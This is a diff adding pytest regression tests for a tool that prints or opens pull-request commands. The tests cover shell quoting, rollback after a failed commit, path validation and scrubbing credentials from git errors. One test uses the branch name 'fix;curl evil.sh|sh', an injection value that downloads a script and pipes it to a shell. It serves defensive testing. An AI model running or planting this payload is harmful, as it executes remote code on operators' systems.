@@ -1,3 +1,4 @@
+import shlex
 from pathlib import Path
 
 import pytest
@@ -150,3 +151,130 @@ def test_failing_git_commit_raises(tmp_path):
 
     with pytest.raises(GatePrError):
         open_or_print_pr(paths, branch="b", pr_title="t", pr_body="x", open_pr=False, _run=run)
+
+
+def test_printed_command_quotes_every_interpolated_value(tmp_path):
+    """DCR-0018: only pr_title was shlex.quote()d, so a branch named
+    `fix;curl evil.sh|sh` — a valid git ref — executed when the operator
+    copy-pasted the printed command, per the documented workflow.
+    """
+    paths = _make_artifacts(tmp_path)
+    runner = _fake_runner_recording()
+    branch = "fix;curl evil.sh|sh"
+
+    result = open_or_print_pr(
+        paths,
+        branch=branch,
+        pr_title="Gate: x",
+        pr_body="body",
+        open_pr=False,
+        _run=runner,
+    )
+
+    assert result.printed_command is not None
+    # the OLD, unquoted interpolation site must be gone...
+    assert f"--head {branch}" not in result.printed_command
+    # ...replaced by the branch as a single, safely-quoted shell token, so a
+    # copy-pasted `curl` never becomes its own command.
+    assert f"--head {shlex.quote(branch)}" in result.printed_command
+    assert shlex.quote(branch) in result.printed_command
+
+
+def test_failed_commit_restores_the_original_branch(tmp_path):
+    """DCR-0017: a failure after `checkout -b` left the repo on a half-created
+    branch, and the deterministic branch name blocked every retry.
+    """
+    paths = _make_artifacts(tmp_path)
+    calls = []
+
+    def run(cmd, **kwargs):
+        calls.append(list(cmd))
+
+        class _CP:
+            returncode = 1 if cmd[:2] == ["git", "commit"] else 0
+            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
+            stderr = "nothing to commit" if cmd[:2] == ["git", "commit"] else ""
+
+        return _CP()
+
+    with pytest.raises(GatePrError):
+        open_or_print_pr(
+            paths,
+            branch="mylonite/gate-fail",
+            pr_title="t",
+            pr_body="x",
+            open_pr=False,
+            _run=run,
+        )
+
+    # the repo must end up back on the branch it started on...
+    assert ["git", "checkout", "main"] in calls
+    # ...and the half-created branch must be deleted so a retry with the same
+    # deterministic branch name doesn't immediately fail on "branch exists".
+    assert ["git", "branch", "-D", "mylonite/gate-fail"] in calls
+    # rollback must happen AFTER the failing commit attempt, not before
+    commit_idx = calls.index(["git", "commit", "-m", "t"])
+    restore_idx = calls.index(["git", "checkout", "main"])
+    assert restore_idx > commit_idx
+
+
+def test_out_of_tree_gate_dir_raises_GatePrError_before_any_checkout(tmp_path):
+    """DCR-0016: relative_to() raised a bare ValueError AFTER the branch switch."""
+    repo_root = tmp_path / "repo"
+    repo_root.mkdir()
+    outside_dir = tmp_path / "outside" / "gate"
+    outside_dir.mkdir(parents=True)
+    (outside_dir / "test_security_x.py").write_text("# t\n", encoding="utf-8")
+    paths = GatePaths(repo_root=repo_root, gate_dir=outside_dir, workflow_files=[])
+    runner = _fake_runner_recording()
+
+    with pytest.raises(GatePrError):
+        open_or_print_pr(
+            paths,
+            branch="b",
+            pr_title="t",
+            pr_body="x",
+            open_pr=False,
+            _run=runner,
+        )
+
+    # nothing destructive (or otherwise) ran — the bad path is caught before
+    # any git subprocess, let alone `checkout -b`.
+    assert runner.calls == []
+
+
+def test_git_stderr_credentials_are_scrubbed(tmp_path, monkeypatch):
+    """DCR-0019: a credentialed remote URL in git's stderr was embedded verbatim."""
+    import mylonite.gate.pr as prmod
+
+    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
+    paths = _make_artifacts(tmp_path)
+    credential = "hunter2verylongtoken1234"
+
+    def run(cmd, **kwargs):
+        class _CP:
+            returncode = 1 if cmd[:2] == ["git", "push"] else 0
+            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
+            stderr = (
+                f"fatal: unable to access "
+                f"'https://octocat:{credential}@github.com/o/r.git/': "
+                f"The requested URL returned error: 403"
+                if cmd[:2] == ["git", "push"]
+                else ""
+            )
+
+        return _CP()
+
+    with pytest.raises(GatePrError) as excinfo:
+        open_or_print_pr(
+            paths,
+            branch="mylonite/gate-x",
+            pr_title="t",
+            pr_body="x",
+            open_pr=True,
+            _run=run,
+        )
+
+    message = str(excinfo.value)
+    assert credential not in message
+    assert "github.com" in message  # host stays legible
